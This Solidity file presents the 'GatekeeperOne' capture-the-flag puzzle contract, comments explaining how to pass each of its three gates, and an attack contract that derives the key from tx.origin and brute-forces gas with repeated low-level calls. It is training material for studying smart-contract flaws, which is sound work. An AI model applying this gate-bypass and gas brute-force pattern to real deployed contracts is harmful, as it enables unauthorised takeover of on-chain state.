// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
// Gate One
// Automatically passed, because msg.sender = 'Attack' but tx.origin = 'player' address

//Gate Two
// Each OPCODE => GAS
// gasleft() => amount of gas left at this point
// total gas = (8191*k) + i

/*Gate Three*/
// bytes8 _gateKey => 0x B1 B2 B3 B4 B5 B6 B7 B8
//Requirement #1
//uint32(uint54(_gateKey))== uint16(uint64(_gateKey))
//uint64(_gateKey) => numerical representation of _gateKey

//uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
//uint16(uint64(_gateKey)) => 0x B7 B8
// 0x B5 B6 B7 B8 = 0x 00 00 B7 B8
//To clear requirement one, B5 and B6 must be zero

//Request #2
//uint32(uint64(_gateKey)) != uint64(_gateKey)
//uint32(uint64(_gateKey)) => 0x B5 B6 B7 B8
// 0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8

//Request #3
// uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
//LHS => 0x B5 B6 B7 B8
//uint160 = 20 bytes = length of an address on ethereum
//uint160(tx.origin) = numerical representation of the address
//uint16(uint160(tx.origin)) => last two bytes of tx.origin
//0x B5 B6 B7 B8 == last two bytes of tx.origin
//0x B7 B8 == last two bytes of tx.origin

//Req #1: B5 and B6 must be zeroes
//Req2 #2: B1 B2 B3 B4 must NOT all be zeroes || B1 B2 B3 B4 equal to first 4 bytes of tx.origin
//Req #3: B7 B8 is equal to last 2 bytes of tx.origin

//BitMasking
//Bitwise AND operator:
// 1 & 0 = 0, 0 & 0 = 0, 1 & 1 = 1
//
// creating key => 
/*
bytes8 gatekey = bytes8(uint64(tx.origin) & 0xFFFFFFFF0000FFFF); //gate3 satisfies
for (uint256 i =0; i<300; i++){
    uint256 totalGas = i+(8191*3);
    gatekeeper.enter{gas : totalGas}(gateKey);
}
*/

contract GatekeeperOneAttack {
    function attack(address gatekeeper) public {
        // Step 1: Derive key based on tx.origin (your address)
        uint16 originLow = uint16(uint160(tx.origin)); // last 2 bytes of origin
        uint64 key = uint64(originLow);                // lower 16 bits

        // Ensure uint32(key) != key
        // So pad the upper bits with non-zero
        key |= uint64(1) << 63; // make it a 64-bit number that fails full match

        bytes8 gateKey = bytes8(key);

        // Step 2: Brute-force gas
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = gatekeeper.call{gas: i + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
